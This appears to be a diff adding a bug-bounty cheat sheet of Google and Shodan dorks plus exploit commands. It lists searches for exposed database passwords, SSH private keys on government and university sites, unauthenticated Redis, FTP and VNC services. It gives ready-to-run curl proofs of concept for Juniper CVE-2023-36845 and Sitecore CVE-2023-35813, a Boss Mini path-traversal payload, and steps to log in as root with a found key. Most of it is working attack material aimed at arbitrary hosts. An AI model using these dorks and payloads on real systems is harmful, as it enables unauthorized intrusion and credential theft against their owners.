@@ -1,0 +1,176 @@
+                      Instant bug bounty 
+Google Dork:
+
+site:*.domain.com "join.slack" ext:pdf "invite"
+site:*.domain.com "join.slack" ext:pdf "invite" "internal"
+site:*.domain.com "join.slack" ext:pdf "invite" "confidential"
+site:*.domain.com "join.slack" ext:pdf "invite" "highly confidential"
+
+================================
+Google Dork
+intitle:"Roxy file manager"
+================================
+
+RedisDB + LDAP - Network Services Bug Hunting
+Shodan Dorks
+
+RedisDB Unauth
+"redis_version"
+
+LDAP Null Bind
+"LDAP:" -401 -403 -404 -400 -unauthorized -forbidden hostname:"*.domain.com"
+================================
+
+Shodan Dorks
+
+FTP
+port:21 "Login Successful" hostname:"*.domain.com"
+
+VNC
+"authentication disabled" "RFB 003.008" hostname:"*.domain.com"
+
+================================
+
+Google Dorks
+inurl:chat site:*.edu ext:txt
+inurl:chat site:*.edu.* ext:txt
+inurl:chat site:*.gov ext:txt
+inurl:chat site:*.gov.* ext:txt
+inurl:chat site:*.domain.com ext:txt
+
+inurl:chat site:*.edu ext:log
+inurl:chat site:*.edu.* ext:log
+inurl:chat site:*.gov ext:log
+inurl:chat site:*.gov.* ext:log
+inurl:chat site:*.domain.com ext:log
+
+================================
+
+# SHODAN DORK
+http.favicon.hash:2141724739
+
+
+# POC EXPLOIT 
+curl -kv "https://<target>/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'
+curl -kv "http://<target>/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'
+
+(Try to add the curl flag option --insecure if doesn't work)
+curl -kv "https://<target>/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"' --insecure
+curl -kv "http://<target>/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"' --insecure
+
+(if the port is not 80,443 we need to add the port as well in target value http://ip:port/about.php........)
+
+# AUTOMATED PUBLIC SCRIPTS
+git clone https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845
+./cve-2023-36845.sh -f ip_list.txt
+
+================================
+
+👉 One Liner cURL Command (PoC) for the Sitecore Remote Code Execution Vulnerability🛡️.
+
+CVE: 2023-35813 (discovered by @mwulftange)
+CVSS Score: 9.8
+Severity: Critical 
+
+curl --data '__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl("%3C%25%40Register%0A%20%20%20%20%20%20%20%20TagPrefix%20%3D%20%27x%27%0A%20%20%20%20%20%20%20%20Namespace%20%3D%20%27System.Runtime.Remoting.Services%27%0A%20%20%20%20%20%20%20%20Assembly%20%3D%20%27System.Runtime.Remoting%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089%27%0A%20%20%20%20%25%3E%0A%20%20%20%20%3Cx%3ARemotingService%20runat%3D%27server%27%0A%20%20%20%20%20%20%20%20Context-Response-ContentType%3D%27THIS%20IS%20VULNERABLE%27%0A%20%20%20%20%2F%3E")' <target>/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index -v
+
+Sometimes, also need to include the curl flag option (--insecure) to disable SSL certificate verification.
+
+Steps:
+1. Change the target and run the command in your terminal. 
+2. Verify by checking Response Header - Content-Type: THIS IS VULNERABLE
+
+
+Shodan Dork:
+http.title:"Sitecore" "200"
+
+http.title:"Sitecore" "200" -401 -400 -404 -502 -forbidden -unauthorized
+
+grep -oP '(?<=<strong>).*?(?=</strong>)' ips.html > ips 
+cat ips | nuclei -t /home/kali/.local/nuclei-templates/http/cves/2023/CVE-2023-35813.yaml  
+
+================================
+
+Google Dork:
+site:irclog.*.*
+site:irclog.*.*.edu
+site:irclog.*.edu.*
+
+Fuzzing endpoints: irclog , irclogs
+Fuzzing types: file,directory,subdomain(recursive)
+
+================================
+Find External Broken Links
+
+blc https://www.example.com -ro -i > broken-links-test.txt
+
+cat broken-links-test.txt | grep "BROKEN"
+
+================================
+
+Google Dorks:
+"MYSQL_PASSWORD" ext:txt
+"DB_PASSWORD" ext:txt
+"PGPASSWORD" ext:txt
+"MONGODB_PASSWORD" ext:txt
+
+Dork with all possible extensions
+"MYSQL_PASSWORD" (ext:txt | ext:log | ext:conf | ext:config | ext:sql | ext:db | ext:ini | ext:cfg | ext:yaml)
+"DB_PASSWORD" (ext:txt | ext:log | ext:conf | ext:config | ext:sql | ext:db | ext:ini | ext:cfg | ext:yaml)
+"PGPASSWORD" (ext:txt | ext:log | ext:conf | ext:config | ext:sql | ext:db | ext:ini | ext:cfg | ext:yaml)
+"MONGODB_PASSWORD" (ext:txt | ext:log | ext:conf | ext:config | ext:sql | ext:db | ext:ini | ext:cfg | ext:yaml)
+
+================================
+Google Dork:
+intitle:"index of" "id_rsa" site:*.gov
+intitle:"index of" "id_rsa" site:*.gov.*
+intitle:"index of" "id_rsa" site:*.edu
+intitle:"index of" "id_rsa" site:*.edu.*
+intitle:"index of" "id_rsa" site:*.domain.com
+intitle:"index of /.ssh"
+intitle:"index of /" intext:id_rsa
+
+save the file as id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa root@serverip
+
+The SSH private key, often found in files like id_rsa, is similar to a digital master key, granting access to sensitive systems and data. If exposed, attackers can exploit this key to impersonate legitimate users, gaining unauthorized entry to servers, databases, or cloud environments. Once inside, they can execute malicious activities such as data theft, tampering, or even complete system compromise.
+
+================================
+
+Step1:First find endpoint to fuzz for hidden parameters
+
+Google Dorks:
+site:*.domain.com ext:php
+site:*.domain.com ext:asp
+site:*.domain.com ext:aspx
+site:*.domain.com ext:jsp
+site:*.domain.com ext:jspx
+
+site:*.domain.com (ext:php OR ext:asp OR ext:aspx OR ext:jsp OR ext:jspx)
+
+Step2:Run arjun on those endpoints
+
+Tool Link : https://github.com/s0md3v/Arjun
+
+Step3: Test for XSS,SQLi,HTMLi,SSTI,LFI,RFI,etc.. on those new parameters collected
+
+Arjun is a command-line tool specifically designed to look for hidden HTTP parameters. Today’s web applications have lots of parameters to make an application dynamic. Arjun will try to discover those parameters and give you a new set of endpoints to test on.
+
+By default, Arjun makes use of a default wordlist but this can be modified by the user. It is a multi-threaded application, can handle rate limiting, allows input of custom headers, and most importantly, supports GET, POST, XML, and JSON methods.
+
+================================
+Google Dork: inurl:/boss/servlet
+Payload: /boss/app/report/popup.html?/etc/passwd
+
+A vulnerability was found in Boss Mini 1.4.0 Build 6221. It has been classified as critical. This affects an unknown part of the file boss/servlet/document. The manipulation of the argument path leads to file inclusion. It is possible to initiate the attack remotely.
+================================
+
+Google Dork:   intitle:"index of /.git"
+
+Exposed git directory along with sensitive information (P3/P4)
+Exposed git directory with no sensitive information (P5)
+
+Git, a popular version control system, is widely used by developers for managing source code. However, misconfigurations or oversight in the Git repository settings can lead to the exposure of sensitive data, including source code, configuration files, and even credentials.
+
+================================
